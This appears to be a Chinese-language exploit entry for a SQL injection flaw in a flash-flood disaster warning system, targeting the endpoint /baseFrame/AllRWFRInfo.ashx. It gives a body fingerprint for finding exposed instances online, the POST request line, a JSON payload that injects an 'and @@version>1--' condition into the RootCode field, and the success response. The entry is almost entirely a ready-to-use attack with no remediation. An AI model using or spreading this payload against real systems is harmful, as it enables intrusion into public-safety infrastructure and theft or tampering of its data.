# 山洪灾害系统AllRWFRInfo存在SQL注入漏洞

山洪灾害系统 ｜ SQL注入 ｜ —
- **指纹**：`body="/AppMC/ECMTE.html`
- **请求**：`POST /baseFrame/AllRWFRInfo.ashx HTTP/1.1`

**Payload**
```
"REQSID": {
"Ex": null,
"UserID": "Admin",
"RESID": "65880587",
"UserGrade": 1
},
"ReqParas": {
"RootCode": "520000000000000'and @@version>1--",
"Ext": ""
},
"DataType": "object",
"ModelID": "AllRWFRInfo"
```
- **响应特征**：200